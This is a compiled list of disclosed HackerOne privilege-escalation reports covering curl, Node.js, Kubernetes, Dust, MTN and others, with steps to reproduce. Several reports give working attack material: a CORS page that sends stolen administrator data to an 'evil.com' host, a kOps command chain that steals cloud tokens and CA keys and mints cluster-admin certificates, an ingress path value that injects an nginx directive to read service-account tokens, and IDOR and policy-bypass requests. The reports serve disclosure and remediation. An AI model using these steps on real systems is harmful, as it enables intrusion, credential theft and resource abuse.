# Privilege Escalation

_122 reports — High/Critical, disclosed_

### [Pending invites remain valid even after the inviter is removed.](https://hackerone.com/reports/3303136)

- **Report ID:** `3303136`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Omise
- **Reporter:** @mantu1738
- **Bounty:** - usd
- **Disclosed:** 2025-10-08T03:51:16.252Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
When an admin (A) invites another user (B) with admin privileges, removing the inviter (A) does not invalidate the pending invite for B. Furthermore, if B has already accepted the invite, B remains in the team with admin privileges. This could allow unauthorized admin access even after the original inviter is removed.

##  Steps to Reproduce
1. Invite a user (A) to the team with **admin privileges**.  
2. A accepts the invitation and becomes an admin.  
3. A invites another user (B) to the team with **admin privileges**.  
4. Remove user A from the team.  
5. Observe:  
   - If B has not accepted the invite, the invite **remains valid**.  
   - If B has already accepted the invite, B **remains in the team** with admin privileges.

# # Expected Behavior
- Pending invites created by a removed admin should **become invalid**.  
- Members already added by the removed admin should either be **reviewed or removed** automatically, depending on platform policy.

# #Actual Behavior
- Pending invites remain valid and can be accepted.  
- Accepted members remain in the team with admin privileges.

##POC
{F4688873}

## Impact

- Unauthorized users may gain admin access after the inviter has been removed.  
- Violation of least privilege principles and potential for **privilege escalation**.  
- Security audit and compliance issues, as removed admins cannot fully revoke their influence.

---

### [Bug Report #23JAN136 (subdomain takeover via shopify )](https://hackerone.com/reports/1851895)

- **Report ID:** `1851895`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Mars
- **Reporter:** @kuriyama
- **Bounty:** - usd
- **Disclosed:** 2025-09-02T15:30:58.017Z
- **CVE(s):** -

**Summary (team):**

A subdomain takeover vulnerability was identified on the domain █████████, where the subdomain pointed to an unclaimed Shopify instance. The researcher discovered that the subdomain was vulnerable to takeover because the DNS record pointed to a Shopify service that was no longer being used by the organization. The vulnerability was successfully exploited by the researcher, who created a Shopify account, added the custom domain █████████, and demonstrated control over the subdomain by setting up a password-protected page. This type of vulnerability occurred when DNS records continued to point to external services (in this case, Shopify) that were no longer actively managed by the organization, allowing attackers to claim the unused service and gain control over the subdomain. The subdomain takeover was confirmed through a working proof of concept where the researcher established control over the domain and set a password ("test") to demonstrate ownership.

---

### [Bug Report #23JAN135 (subdomain takeover via shopify )](https://hackerone.com/reports/1851886)

- **Report ID:** `1851886`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Mars
- **Reporter:** @kuriyama
- **Bounty:** - usd
- **Disclosed:** 2025-09-02T15:23:47.077Z
- **CVE(s):** -

**Summary (team):**

The researcher kuriyama discovered a subdomain takeover vulnerability affecting ██████████, which was pointing to an unclaimed Shopify instance. The researcher successfully demonstrated the takeover by claiming the subdomain and setting up a proof-of-concept storefront.

---

### [Elevation of Privileges (EoP) vulnerabilities related to the some easy_options on Windows](https://hackerone.com/reports/2941920)

- **Report ID:** `2941920`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** curl
- **Reporter:** @justlikebono_official
- **Bounty:** - usd
- **Disclosed:** 2025-07-03T06:43:25.420Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

An Elevation of Privileges (EoP) vulnerability can occur in a Windows privileged process that uses CURLOPT_COOKIEJAR, CURLOPT_HSTS, or CURLOPT_ALTSVC.
This vulnerability arises due to the differences in the implementation of the unlink function between Windows and Linux, as well as the behavior of MoveFileEx, which follows specially crafted links.
Given that many components, such as program updaters, frequently use curl with elevated privileges, this issue must be considered a serious concern.

## Affected version

libcurl latest version (8.11.1)

## Description

libcurl provides easy options such as `CURLOPT_COOKIEJAR`, `CURLOPT_HSTS`, and `CURLOPT_ALTSVC`. For example, when `CURLOPT_COOKIEJAR` is set, the library user can specify a file where cookie information will be stored.

Since libcurl is widely used for web communication, it is often utilized in privileged programs that need to communicate with web servers, such as program updaters.

The issue is that privileged programs using the aforementioned options may occur a Elevation of Privileges (EoP) vulnerability. Since all three options share a very similar code structure, this explanation will focus on `CURLOPT_COOKIEJAR`.

In the `cookie_output` function of `lib/cookie.c`, the output file's `FILE` pointer is obtained via `Curl_fopen`. The `Curl_fopen` function generates a random temporary file based on the file path specified by the library user through `CURLOPT_COOKIEJAR` and returns the `FILE` pointer to this temporary file.

Subsequently, `cookie_output` writes the cookie contents to the temporary file and then moves the temporary file to the user-specified file path using `Curl_rename`. Internally, `Curl_rename` calls the `MoveFileExA` API, and if this attempt fails, it tries to delete the temporary file using the `unlink` function.
(https://github.com/curl/curl/blob/c5bb4e77e414c1505d800a0091a6d57c7f75d416/lib/cookie.c#L1660)

If the file path for storing cookies is in a user-writable location, a specially crafted link in Windows can be used to redirect the calls to `MoveFileExA` or `unlink` to operate on an arbitrary file. The `MoveFileExA` function follows this special link as is, while the `unlink` function, which executes through the Windows C runtime (`unlink() -> remove() -> DeleteFile(WINAPI)`), also follows the link.

Through this mechanism, an attacker can leverage a privileged process to achieve **arbitrary file deletion**, which can ultimately lead to **escalation of privilege (EoP) to SYSTEM** using well-known exploitation techniques.

At first glance, it may seem that exploiting this issue requires a race condition. However, it can be exploited in a highly reliable manner using **oplocks**.

For more details on how arbitrary file deletion can be abused to escalate privileges, refer to the ZDI blog post linked below:
(https://www.thezdi.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)

To help understand this issue better, a proof-of-concept (PoC) demonstrating the vulnerability will be provided, along with step-by-step instructions on how to reproduce it in the next section.

## Steps To Reproduce:

  1. To reproduce the issue described above, I created a simple program (`curl_EoP.sln`) that sends a web request using libcurl and the `CURLOPT_COOKIEJAR` option.

     Additionally, `curl_EoP_Exp.sln` demonstrates how this program can be exploited to achieve **high-privilege arbitrary file deletion**.
      This exploit modifies the deletion of `"C:/ProgramData/curl_EoP/{temporary_file_name}.tmp"` to delete `"C:/Windows/test_file.txt"` instead.

     ### Steps to Reproduce:

     1. Open an **administrator CMD** and create `test_file.txt` by running the following command:

        ```cmd
        echo "tempfile" > C:/Windows/test_file.txt
        ```

     2. Use **Visual Studio C/C++ 2022** to build `curl_EoP_Exp.sln` and `curl_EoP.sln` (x64-Release).

        - **Note**: `curl_EoP.sln` requires **libcurl**.

     3. Run `curl_EoP_Exp.exe` **with normal user privileges**.

        - **Ignore** any stdout output.

     4. Run `curl_EoP.exe` **with administrator or SYSTEM privileges**.

     5. As a result of the exploit, **`C:/Windows/test_file.txt` will be deleted**.

## Patch Suggestion

The `GetFinalPathNameByHandle` API can be used to retrieve the final destination file path of a specific file handle.

By comparing this retrieved path with the expected file name, it is possible to determine whether the path has been manipulated via links.

Implement a secure wrapper around functions like `MoveFileExA` and `unlink` that incorporates this logic to prevent exploitation.

## Supporting Material/References:

  * curl_EoP.zip: source codes of curl_EoP.sln
  * curl_EoP_Exp.zip: source codes of curl_EoP_Exp.sln
  * PoC.mp4: A video of reproduce steps

## Impact

## Summary:
A medium-privileged attacker can achieve Escalation of Privilege (EoP) to SYSTEM by targeting any privileged program that uses the CURLOPT_COOKIEJAR, or  CURLOPT_HSTS, or CURLOPT_ALTSVC options with a user writable path.

---

### [Privilege Escalation leads to Unauthorized Access to Private Conversations By any Regular user  [Read , Edit and Delete]](https://hackerone.com/reports/3103849)

- **Report ID:** `3103849`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Dust
- **Reporter:** @0xsom3a
- **Bounty:** - usd
- **Disclosed:** 2025-04-29T11:01:20.804Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary:
A normal authenticated user on dust.tt can escalate their privileges by accessing, modifying, and deleting any chat threads belonging to other users — including administrators — through a vulnerable API endpoint without having the appropriate permissions.

#Vulnerability Details:

## Reading Other Users’ Conversations:

`GET /api/w/<Workspace-id>/assistant/conversations/<victim-conversation-id>`

###Example:

```http
GET /api/w/mRHt1cXVmK/assistant/conversations/<ADMIN-conversation-id> HTTP/2
Host: dust.tt
Cookie: <User-session_token_or_cookies>
```
###Response:

```json
{
  "conversation": {
    "id": [conversation_numeric_id], 
    "created": [timestamp_in_milliseconds], 
    "sId": "[conversation_string_id]", 
    "owner": {
      "id": [user_numeric_id], 
      "sId": "[user_string_id]", 
      "name": "[username]", 
      "role": "[user_role]", 
      "segmentation": null,
      "ssoEnforced": false, 
      "whiteListedProviders": null, 
      "defaultEmbeddingProvider": null, 
      "metadata": {
        "isBusiness": false
      }
    },
    "title": "[conversation_title]", 
    "visibility": "[visibility_status]", 
    "requestedGroupIds": []
  }
}
```

---

## Deleting Other Users’ Conversations:

- By sending a DELETE request to the same endpoint, the attacker can delete any conversation:

```http
DELETE /api/w/mRHt1cXVmK/assistant/conversations/<ADMIN-conversation-id> HTTP/2
Host: dust.tt
Cookie: <User-session_token_or_cookies>
```
- No additional verification is performed server-side to confirm ownership of the conversation.

- The request succeeds and the conversation is permanently deleted from the target workspace.

---

## Editing Other Users’ Conversations:

Similarly, an attacker can update the content or metadata of a conversation by sending a PATCH request:


###Example:

```http
PATCH /api/w/[Workspace ID]/assistant/conversations/[Conversation ID]
Content-Type: application/json
Cookie: <User-session_token_or_cookies>

{
  "title": "Updated by Attacker",
   "visibility":"unlisted"
}
```
###Response:

```json
{
  "conversation": {
    "id": [conversation_numeric_id],
    "created": [timestamp_in_milliseconds],
    "sId": "[conversation_string_id]",
    "owner": {
      "id": [owner_numeric_id],
      "sId": "[owner_string_id]",
      "name": "[owner_username]",
      "role": "[owner_role]",
      "segmentation": null,
      "ssoEnforced": false,
      "whiteListedProviders": null,
      "defaultEmbeddingProvider": null,
      "metadata": {
        "isBusiness": false
      }
    },
    "title": "[conversation_title]",
    "visibility": "[visibility_status]",
    "content": [
      [
        {
          "id": [message_id],
          "sId": "[message_string_id]",
          "type": "[message_type]",
          "visibility": "[message_visibility]",
          "version": 0,
          "created": [message_timestamp],
          "user": {
            "sId": "[user_string_id]",
            "id": [user_numeric_id],
            "createdAt": [user_created_timestamp],
            "provider": "[auth_provider]",
            "username": "[user_username]",
            "email": "[user_email_address]",
            "firstName": "[user_first_name]",
            "lastName": "[user_last_name]",
            "fullName": "[user_full_name]",
            "image": "[user_profile_image_url]"
          },
          "mentions": [],
          "content": "[message_content]",
          "context": {
            "username": "[user_username]",
            "timezone": "[user_timezone]",
            "fullName": "[user_full_name]",
            "email": "[user_email_address]",
            "profilePictureUrl": "[user_profile_image_url]",
            "origin": "[message_origin]"
          }
        }
      ]
    ],
    "requestedGroupIds": []
  }
}
```
---

#POC VIDEO:

█████████

---

## Impact

This vulnerability allows a normal user to:

- **Read private conversations** of any user, including admins.
- **Modify other users' chat threads**.
- **Delete chat threads** of other users without their consent.

This issue **severely compromises** the **confidentiality**, **integrity**, and **availability** of user data within the application, making it a critical security concern that needs to be addressed immediately.

---

### [Unauthorized access to PII leads to Administrator account Takeover](https://hackerone.com/reports/2450685)

- **Report ID:** `2450685`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** MTN Group
- **Reporter:** @h0w
- **Bounty:** - usd
- **Disclosed:** 2025-02-22T15:48:49.662Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
This vulnerability is present in the `wp-json/wp/v2/users/15` file located in the wordpress directory endpoints. This flaw arises from insufficient restrictions placed on the list of post authors, which can be exploited by remote attackers to obtain sensitive information through wp/v2/users/15 requests attackers can obtain sensitive information in the form of email addresses (PII Leaks) and will be used in `wp-login` to send forget password or brute-force password requests.

**Descriptions:**
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page CORS misconfiguration is found on vanillaforums.com as `Access-Control-Allow-Credentials: true`.

**Platform(s) Affected: [website]**
https://www.mtn.com/wp-json/wp/v2/users/15

## Steps To Reproduce:
  1. Navigate visit hostname or directory on https:\/\/www.mtn.com\/wp-json\/wp\/v2\/users\/9
  1. Intercept request to `burp-suite` and you will see unauthenticated APIs `administrator_login` email address exposed

{F3171358}

  3. copy this scripts and save file as `.html` and open in our browsers 

```html
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal administrator PII data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://burpcollaborator-intruder-evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.mtn.com/wp-json/wp/v2/users/15", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
{F3171366}


## Supporting Material/References:
  * It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request.
  * It's also possible to create a rewrite rule on `.htaccess` (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: "^.rest_route=/wp-json/wp/v2/users/15") to a Not Found (404) or a Default Page.

## Impact

1. Attacker get sensitive information PII Leaks (email adress)
 1. Attacker can brute-force the password use the valid administrator login
 1. CORS Misconfiguration, could lead to disclosure of sensitive information
 * Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
 * This website using Wordpress , so developer forget to enable authenticator in the APIs that can view information of admin user. By access to this link, attacker can get `username` and `email_address` and other information of user admin.

---

### [Non Org Admin/Group Manager can create groups in an organization](https://hackerone.com/reports/2372018)

- **Report ID:** `2372018`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** HackerOne
- **Reporter:** @akashhamal0x01
- **Bounty:** - usd
- **Disclosed:** 2024-07-23T11:38:43.148Z
- **CVE(s):** -

**Summary (team):**

This report describes a privilege escalation vulnerability that allows a user with only "Program Admin" permissions, to escalate their privileges to higher levels like "Report Manager" or even full administrator privileges under certain circumstances. 

The vulnerability exists due to a mutation in the GraphQL API that lets a low privileged attacker assign themselves to the default admin groups created when a new program is set up. By assigning themselves to these groups, the attacker gains elevated permissions like the ability to modify reports, award bounties, manage users and groups, etc.

The issue is amplified if the organization admin later modifies the permissions for the default admin groups, as the attacker can then re-assign those groups to themselves and inherit the new elevated permissions.

In summary, this allows an unauthorized privilege escalation from a low privileged state to potentially full administrative control over a program. The reporter provided clear reproduction steps and worked closely with the HackerOne team to validate the issue. After confirming it was a valid high severity vulnerability, a fix was implemented and the report was resolved.

---

### [setuid() does not drop all privileges due to io_uring](https://hackerone.com/reports/2170226)

- **Report ID:** `2170226`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Node.js
- **Reporter:** @valette
- **Bounty:** - usd
- **Disclosed:** 2024-03-16T17:43:08.076Z
- **CVE(s):** CVE-2024-22017

**Summary (team):**

`setuid()` does not affect libuv's internal io_uring operations if initialized before the call to `setuid()`.
This allows the process to perform privileged operations despite presumably having dropped such privileges through a call to `setuid()`.

This vulnerability affects all users using version greater or equal than Node.js 18.18.0, Node.js 20.4.0 and Node.js 21.

---

### [Code injection and privilege escalation through Linux capabilities](https://hackerone.com/reports/2237545)

- **Report ID:** `2237545`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Node.js
- **Reporter:** @tniessen
- **Bounty:** - usd
- **Disclosed:** 2024-02-15T18:35:43.822Z
- **CVE(s):** CVE-2024-21892

**Summary (team):**

On Linux, Node.js ignores certain environment variables if those may have been set by an unprivileged user while the process is running with elevated privileges with the only exception of `CAP_NET_BIND_SERVICE`.

Due to a bug in the implementation of this exception,  Node.js incorrectly applies this exception even when certain other capabilities have been set.

This allows unprivileged users to inject code that inherits the process's elevated privileges.

---

### [Permissions policies can be bypassed via Module._load.](https://hackerone.com/reports/1960870)

- **Report ID:** `1960870`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Node.js
- **Reporter:** @mattaustin
- **Bounty:** - usd
- **Disclosed:** 2023-08-16T17:48:41.672Z
- **CVE(s):** CVE-2023-32002

**Summary (team):**

The use of `Module._load()` can bypass the policy mechanism and require modules outside of the policy.json definition for a given module.

This vulnerability affects all users using the experimental policy mechanism in all active release lines: 16.x, 18.x and, 20.x.

Please note that at the time this CVE was issued, the policy is an experimental feature of Node.js.

---

### [Privilege Escalation in kOps using GCE/GCP Provider](https://hackerone.com/reports/1842829)

- **Report ID:** `1842829`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Kubernetes
- **Reporter:** @jpts
- **Bounty:** 2500 usd
- **Disclosed:** 2023-08-04T19:24:50.539Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
When using kOps with the GCP provider, it is possible for a user with shell access to any pod, to escalate their privileges to cluster admin. During provisioning of the cluster, kOps gives all nodes access to the state storage bucket through the service account associated with the instance. Any user with shell access can request the service account credentials, and read sensitive information from the state store. Using this information, the user can privesc to cluster admin, compromising the entire cluster. It is further possible to compromise a privileged GCP service account associated with the control-plane nodes and takeover other resources in the GCP project.

## Kubernetes Version:
Kubernetes: v1.25.5

## Component Version:
kOps: v1.25.3

## Steps To Reproduce:
### Cluster Setup:

The test cluster was setup as close to the [getting started](https://kops.sigs.k8s.io/getting_started/gce/) guide as possible.
```bash
export KOPS_STATE_STORE=gs://kops-state-test/
export PROJECT=`gcloud config get-value project`

gsutil mb $KOPS_STATE_STORE
kops create cluster kops.k8s.local --zones europe-west1-b --state ${KOPS_STATE_STORE} --project=$PROJECT --master-size=n1-standard-2 --node-size=n1-standard-2
kops update cluster --name kops.k8s.local --yes --admin
kops validate cluster --wait 10m
```
### Privesc
  1. Add a demo container in which user is allow shell access (manifest attached):
  `k apply -f shell.yaml`
  2. Give ourselves a shell:
  `k exec -it shell-5d64dd647c-8l8s6 -it -- ash`
  3. Grab the service account token and state bucket name
  ```
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script -O- | grep ConfigBase
  ```
  4. Copy file back to the host
  ```
  k cp shell-5d64dd647c-8l8s6:/default.token default.token
  ```
  5.  Ensure normal gcloud auth not in use and set token environment var
  ```
  gcloud auth revoke
  export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./default.token)
  ```
  6. Grab the kubernetes CA keys
  ```
  mkdir -p keys
  gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].privateMaterial' - | base64 -d > keys/ca.key
  gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].publicMaterial' - | base64 -d > keys/ca.pem
  ```
  7. Generate system:masters cert (csr.json template attached)
  ```
  cd keys
  cfssl gencert -ca=ca.pem -ca-key=ca.key -profile=kubernetes csr.json | cfssljson -bare user
  ```
  8. Construct new kubeconfig
  ```
  export KUBECONFIG=./pwn.kconfig
  k config set-credentials pwn --client-certificate=user.pem --client-key=user-key.pem
  k config set-cluster kops --certificate-authority=ca.pem --server=https://<kops-ip>
  k config set-context pwn@kops --cluster=kops --user=pwn
  k config use-context pwn@kops
  ```
  9. Check we are cluster-admin
  `k auth can-i '*' '*' -A`
  10. Deploy a pod on the master node (example manifest included), make sure to edit to the correct node name
  `k apply -f shell-master.yaml`
  11. Give ourselves a shell:
  `k exec -it shell-78d66f6f7c-ft7ch -it -- ash`
  12. Grab the privileged GCP service account token
  ```
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O admin.token
  ```
 13. Copy the token back to our host
  ```
  k cp shell-78d66f6f7c-ft7ch:/admin.token admin.token
  ```
  14. Set our credentials
  ```
  export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./admin.token)
  ```
  15. Run a cryptominer ....
  ```
  gcloud compute instances create miner --image-family=ubuntu-2204-lts --zone=europe-west1-b --image-project=ubuntu-os-cloud
  ```

## Supporting Material/References:
  * shell.yaml - basic alpine deployment to simulator a user with shell access
  * shell-master.yaml - similar simple deployment, targeting a master node
  * csr.json - used to configure cfssl to generate the malicious system:masters mTLS certs
  * auth-can-i.png - proof we have cluster admin
  * miner.png - proof we can spin up arbitrary instances
  * [Kubernetes Engine Service Agent Role](https://cloud.google.com/iam/docs/understanding-roles#container.serviceAgent)

## Tools used
 * https://github.com/cloudflare/cfssl
 * https://github.com/mikefarah/yq

## Impact

Once the attacker has compromised the cluster, they have access to all cluster resources. This includes any secrets/data stored by the cluster and also any secrets/data that is accessible by any GCP service accounts in use by the cluster. As the attacker is able to compromise the cluster, they can compromise the master nodes. In GCE kOps, the master node service accounts have the "Kubernetes Engine Service Agent" role, which is highly permissive, and would likely allow the compromise of other resources in the GCP project. Since the role has compute create permissions, it could also be abused for  attacks such as crypto-mining.

---

### [The use of __proto__ in process.mainModule.__proto__.require() bypasses the permission system in Node v19.6.1](https://hackerone.com/reports/1877919)

- **Report ID:** `1877919`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Node.js
- **Reporter:** @haxatron1
- **Bounty:** - usd
- **Disclosed:** 2023-07-20T20:55:30.392Z
- **CVE(s):** CVE-2023-30581

**Vulnerability Information:**

process.mainModule.require() correctly works with permission system in Node v19.6.1. 
But the use of \_\_proto\_\_  in process.mainModule.\_\_proto\_\_.require() can bypass the check.

# Description and STR
Consider the following policy.json:
`````
{
  "resources": {
    "./proc.js": {
      "integrity": true
    }
  }
}
`````
The policy only allows proc.js file to be loaded without any dependencies.

However with the following proc.js
`````
const os = process.mainModule.__proto__.require("os")

console.log(process.version)
console.log(os.version())
`````
We get the output:
`````
└─$ ../node-v19.6.1-linux-x64/bin/node --experimental-policy=policy.json proc.js
v19.6.1
#1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)
(node:2720) ExperimentalWarning: Policies are experimental.
(Use `node --trace-warnings ...` to show where the warning was created)
`````
Therefore os dependency can be loaded and os.version executed even if unspecified in permission system.

## Impact

Bypass the permission system

---

### [Ad Account Takeover](https://hackerone.com/reports/1791720)

- **Report ID:** `1791720`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** LinkedIn
- **Reporter:** @them4les_l1r
- **Bounty:** - usd
- **Disclosed:** 2023-07-20T18:46:52.283Z
- **CVE(s):** -

**Summary (team):**

The researcher found an authorization issue in LinkedIn Marketing Solutions - Business Manager, which allowed an attacker to bind an unrelated Campaign Manager Account via the attacker's Business Manager. This could have led to unauthorized access to the target's LinkedIn Campaign Manager. We addressed and resolved the issue within 24 hours.

**Summary (researcher):**

‎

---

### [Brave News feeds can open arbitrary chrome: URLs](https://hackerone.com/reports/1819668)

- **Report ID:** `1819668`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Brave Software
- **Reporter:** @nishimunea
- **Bounty:** 600 usd
- **Disclosed:** 2023-06-22T05:50:08.953Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
URL link in Brave News feeds can open arbitrary chrome: URLs.
This behavior can be exploited as a way to bypass SOP and gain access to privileged URLs.

## Products affected: 

 * 1.46.144 Chromium: 108.0.5359.128 (Official Build) （x86_64）

## Steps To Reproduce:

 * Open new tab and click customize button
 * Follow https://csrf.jp/brave/rss_chrome.php as a RSS feed of Brave News
 * Reload the tab
 * RSS feeed that name is "Access chrome: URLs" is shown on Brave News
 * Click the feed
 * `chrome://settings/resetProfileSettings?origin=userclick` is opened on the tab

## Supporting Material/References:

  * See the demonstration movie I attached

## Impact

Bypass SOP and gain access to privileged URLs.

---

### [Permissions policies can be bypassed via process.mainModule](https://hackerone.com/reports/1747642)

- **Report ID:** `1747642`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Node.js
- **Reporter:** @goums
- **Bounty:** - usd
- **Disclosed:** 2023-03-19T17:12:01.356Z
- **CVE(s):** CVE-2023-23918

**Vulnerability Information:**

**Summary:** 
Permissions policies module can be bypassed via `process.mainModule.require`

**Description:**
Permission policies allow to run a script with a specific set of authorized node js built-in modules.
However, the script could access non authorized modules by calling `process.mainModule.require()`

## Steps To Reproduce:

  1. Create `escape.js` file:
```
console.log(process.mainModule.require("os").cpus());
```
  2. Create `policy.json` file:
```
{
  "onerror": "exit",
  "scopes": {
    "file:": {
      "integrity": true,
      "dependencies": {}
    }
  }
}
```

  3. Run:
```
node --experimental-policy=policy.json escape.js
```
4. You will see your os cpus listed in the console even though the `escape.js` file does not have the permission to import the node`os` module

## Impact: 
Permission policies are supposed to enforce imported modules to a limited whitelist.
This vulnerability allow a script to include any non-whitelisted module.

If you modify `escape.js` to use top level `require` statement, like this:
```
const os = require("os");
console.log(os.cpus());
```
and run again:
```
node --experimental-policy=policy.json escape.js
```
you'll now see this error:
```
Error [ERR_MANIFEST_DEPENDENCY_MISSING]: Manifest resource escape.js does not list os as a dependency specifier for conditions: require, node, node-addons
```
which is the expected behavior and should be enforced as well when using `process.mainModule.require`

## Impact

Any project that uses permission policies for arbitrary code execution are vulnerable to sandbox escaping.
This example show a non-critical permission gain (listing the machine cpu), but an attacker could do much more damage by accessing internal file system, running child processes, ...

---

### [Email Verification Bypass Allows Users to Add & verify Any Email  As Guardians Email ](https://hackerone.com/reports/1636552)

- **Report ID:** `1636552`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Khan Academy
- **Reporter:** @shuvam321
- **Bounty:** - usd
- **Disclosed:** 2022-12-17T02:33:28.678Z
- **CVE(s):** -

**Vulnerability Information:**

1. Go to https://www.khanacademy.org/signup and signup as learner keeping date of birth below 13 years.
{F1821117}
2. Now keep victims email as parent's email for example here I am keeping info@khanacademy.org as parents email and click on signup.
████
3. Now you will see a following message "Your parent or guardian must approve your account or it will be deleted in 7 days".
██████
4. Now go to https://www.khanacademy.org/settings/account and update your email to temporary email or any email you have access to.
██████████
██████
5. Now, you will receive a verification email in your temporary email you have access to. But don't click on the email. Now again change the email to info@khanacademy.org.

{F1821137} ███████
6. Now open the verification email you received in your temporary email account in an incognito tab and refresh your child's account. We have successfully tied info@khanacademy.org as parent account with email verification.

This is the account that I created : Username : ██████ Password : ██████████ Email : ████

█████████

## Impact

Attacker is able to bypass email verification.

---

### [Subdomain takeover at http://test.www.midigator.com](https://hackerone.com/reports/1718371)

- **Report ID:** `1718371`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Equifax-vdp
- **Reporter:** @valluvarsploit_h1
- **Bounty:** - usd
- **Disclosed:** 2022-11-12T16:05:05.413Z
- **CVE(s):** -

**Vulnerability Information:**

## Vulnerability
Subdomain test.www.midigator.com points to an AWS S3 bucket that no longer exists. I was able to take control of this bucket and serve my own content on it.

## Proof Of Concept
```code
$ dig test.www.midigator.com
[snipped]
;; ANSWER SECTION:
test.www.midigator.com.	60	IN	CNAME	test.www.midigator.com.s3-website-us-west-1.amazonaws.com.
test.www.midigator.com.s3-website-us-west-1.amazonaws.com. 59 IN CNAME s3-website-us-west-1.amazonaws.com.
s3-website-us-west-1.amazonaws.com. 4 IN A	52.219.193.3
```

{F1963195}

## Remediation
Remove the CNAME entry for the `test.www.midigator.com`

## Impact

Subdomain Takeover

---

### [Main Domain Takeover at  https://www.marketo.net/](https://hackerone.com/reports/1661914)

- **Report ID:** `1661914`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Adobe
- **Reporter:** @gdattacker
- **Bounty:** - usd
- **Disclosed:** 2022-09-26T15:05:54.857Z
- **CVE(s):** -

**Summary (team):**

Resolved valid subdomain takeover report on Marketo. We appreciate the collaboration with the researcher.

---

### [Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token](https://hackerone.com/reports/1382919)

- **Report ID:** `1382919`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Kubernetes
- **Reporter:** @0ria
- **Bounty:** 2500 usd
- **Disclosed:** 2022-08-06T07:14:09.096Z
- **CVE(s):** -

**Vulnerability Information:**

Report Submission Form

## Summary:
A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).

## Kubernetes Version:
1.20 (should work on (1.21 as well)

## Component Version:
nginx ingress controller v1.0.4

## Steps To Reproduce:
I deployed the latest ingress-controller (v1.0.4).
I used a user (gaf_test) that has the permissions to get, create and update ingress resources
(the “get” permissions is only to allow kubectl to view the newly created resource).

ingress-creator-role.yaml
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ingress-creator
  namespace: default
rules:
- apiGroups: ["networking.k8s.io"]
  resources: ["ingresses"]
  verbs: ["get", "create", "update"]
```

ingress-creator-role-binding.yaml
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: gaf_test-ingress-creator-binding
  namespace: default
subjects:
- kind: User
  name: gaf_test
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: ingress-creator
  apiGroup: rbac.authorization.k8s.io
```

This user (gaf_user) cannot list secrets at all.
{F1495367}
 
Use this user (gaf_user) to create a new ingress resource in the default namespace.

ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: gaf-ingress
  annotations:
    kubernetes.io/ingress.class: "nginx"
spec:
  rules:
  -  http:
      paths:
        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
          pathType: Prefix
          backend:
            service:
              name: some-service
              port:
                number: 5678
```
```
kubectl apply -f ingress.yaml
```
{F1495369}
 

Access to nginx ingress loadbalancer to /gaf/token path.

